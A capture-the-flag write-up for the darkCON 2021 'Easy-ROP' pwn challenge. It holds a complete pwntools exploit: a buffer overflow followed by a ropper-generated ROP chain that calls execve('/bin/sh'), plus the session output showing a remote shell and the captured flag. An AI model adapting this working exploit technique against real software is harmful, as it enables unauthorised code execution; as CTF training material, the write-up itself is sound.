## Pwn/Easy-ROP

```
Manish
84 solves / 441 points

Welcome to the world of pwn!!! This should be a good entry level warmup challenge !! Enjoy getting the shell

connection : nc 65.1.92.179 49153
```

Tags: _pwn_ _x86-64_ _rop_

Exploit:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./easy-rop')

if args.REMOTE:
	p = remote('65.1.92.179', 49153)
else:
	p = process(binary.path)

# ropper --file easy-rop --chain "execve cmd=/bin/sh" --badbytes 0a
IMAGE_BASE_0 = binary.address
rebase_0 = lambda x : p64(x + IMAGE_BASE_0)
rop  = b''
rop += rebase_0(0x00000000000113c3) # 0x00000000004113c3: pop r13; ret;
rop += b'//bin/sh'
rop += rebase_0(0x000000000000205b) # 0x000000000040205b: pop rbx; ret;
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x000000000006c635) # 0x000000000046c635: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000113c3) # 0x00000000004113c3: pop r13; ret;
rop += p64(0x0000000000000000)
rop += rebase_0(0x000000000000205b) # 0x000000000040205b: pop rbx; ret;
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x000000000006c635) # 0x000000000046c635: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000191a) # 0x000000000040191a: pop rdi; ret;
rop += rebase_0(0x00000000000c00e0)
rop += rebase_0(0x000000000000f4be) # 0x000000000040f4be: pop rsi; ret;
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x000000000000181f) # 0x000000000040181f: pop rdx; ret;
rop += rebase_0(0x00000000000c00e8)
rop += rebase_0(0x00000000000175eb) # 0x00000000004175eb: pop rax; ret;
rop += p64(0x000000000000003b)
rop += rebase_0(0x000000000001e394) # 0x000000000041e394: syscall; ret;

payload  = b''
payload += 0x48 * b'A'
payload += rop

p.sendlineafter('name:',payload)
p.interactive()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/darkconctf2021/easyrop/easy-rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 65.1.92.179 on port 49153: Done
[*] Switching to interactive mode
$ id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
$ ls -l
total 880
-rwxr-xr-x 1 root root 872056 Feb 10 18:12 easy-rop
-rw-r--r-- 1 root root     49 Feb 10 18:20 flag
-rwxr-xr-x 1 root root     71 Feb 10 18:15 run.sh
-rwxr-xr-x 1 root root  18744 Sep 14 11:40 ynetd
$ cat flag
darkCON{w0nd3rful_m4k1n9_sh3llc0d3_us1n9_r0p!!!}
```
